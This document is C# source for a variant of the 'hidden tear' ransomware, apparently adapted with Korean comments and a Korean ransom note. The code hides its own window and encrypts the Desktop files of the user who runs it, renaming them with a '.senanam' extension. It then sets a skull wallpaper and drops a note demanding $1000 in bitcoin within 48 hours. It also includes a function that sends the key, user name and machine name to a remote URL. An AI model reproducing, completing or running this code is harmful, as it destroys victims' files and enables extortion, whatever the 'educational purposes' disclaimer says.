/*
 _     _     _     _              _                  
| |   (_)   | |   | |            | |                 
| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
 
 * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 * 
 * Ve durdu saatler 
 * Susuyor seni zaman
 * Sesin dondu kulagimda
 * Dedi uykudan uyan
 * 
 * Yine boyle bir aksamdi
 * Sen guluyordun ya gozlerimin icine
 * Feslegenler boy vermisti
 * Gokten parlak bir yildiz dustu pesine
 * Sakladim gozyaslarimi
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Reflection;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        string targetURL = "https://www.example.com/hidden-tear/write.php?info=";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";



        const int SPI_SETDESKWALLPAPER = 0x0014;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;

        [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);



        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;

            //starts encryption at form load
            startAction();

            //string imagePath = Path.Combine("pic", "skull.jpg");
            //Image image = Image.FromFile(imagePath);
            //SetDesktopWallpaper(image);

            //Assembly assembly = Assembly.GetExecutingAssembly();
            //Stream imageStream = assembly.GetManifestResourceStream("skull.jpg");

            //Image image = Image.FromStream(imageStream);
            Image image = Properties.Resources.skull;
            SetDesktopWallpaper(image);

            //if (imageStream != null)
            //{
            // Image image = Image.FromStream(imageStream);

            // 바탕화면 변경 코드
            // SetDesktopWallpaper(image);
            //}
            //else
            //{
            //Console.WriteLine("이미지 파일을 찾을 수 없습니다.");
            //}

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        static byte[] GetImageData()
        {
            // 이미지 데이터를 직접 바이트 배열로 생성
            byte[] imageData = new byte[] { /* 이미지 바이트 데이터 */ };
            return imageData;
        }

        static void SetDesktopWallpaper(Image image)
        {
            // 이미지 파일을 Themes 디렉토리에 복사
            string imagePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Roaming\Microsoft\Windows\Themes\WallpaperImage.jpg");
            using (FileStream stream = new FileStream(imagePath, FileMode.Create))
            {
                image.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
            }

            // 레지스트리에 바탕화면 이미지 경로 설정
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue("Wallpaper", imagePath);
            key.SetValue("WallpaperStyle", "2"); // 타일로 설정

// 바탕화면 변경
SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imagePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            //const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            //StringBuilder res = new StringBuilder();
            //Random rnd = new Random();
            //while (0 < length--){
            //    res.Append(valid[rnd.Next(valid.Length)]);
            //}
            //return res.ToString();
	    string staticpw = "1234";
	    return staticpw;
        }

        //Sends created password target location
        public void SendPassword(string password){
            
            string info = computerName + "-" + userName + " " + password;
            var fullUrl = targetURL + info;
            var conent = new System.Net.WebClient().DownloadString(fullUrl);
        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+".senanam");

            
            

        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", "hwp", "hwpx"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++){
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i],password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++){
                encryptDirectory(childDirectories[i],password);
            }
            
            
        }

        public void startAction()
        {
            string password = CreatePassword(1);
            password = "1234";
            string path = "\\Desktop";
            string startPath = userDir + userName + path;
            //SendPassword(password);
            encryptDirectory(startPath,password);
            messageCreator();
            System.Windows.Forms.Application.Exit();
        }

        public void messageCreator()
        {
            string path = "\\Desktop\\READ_IT.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "당신의 컴퓨터는 랜섬웨어에 감염되었습니다.", "당신의 파일과 데이터는 현재 암호화되었으며,", "복구하려면 비트코인으로 $1000를 팀 세나남 명의로 송금해야합니다.", "48시간 이내에 지불하지 않을 경우 파일을 영구적으로 손상시키겠습니다.", "빠른 조치를 취해주시기 바랍니다." };
            System.IO.File.WriteAllLines(fullpath, lines, Encoding.UTF8);
        }
    }
}
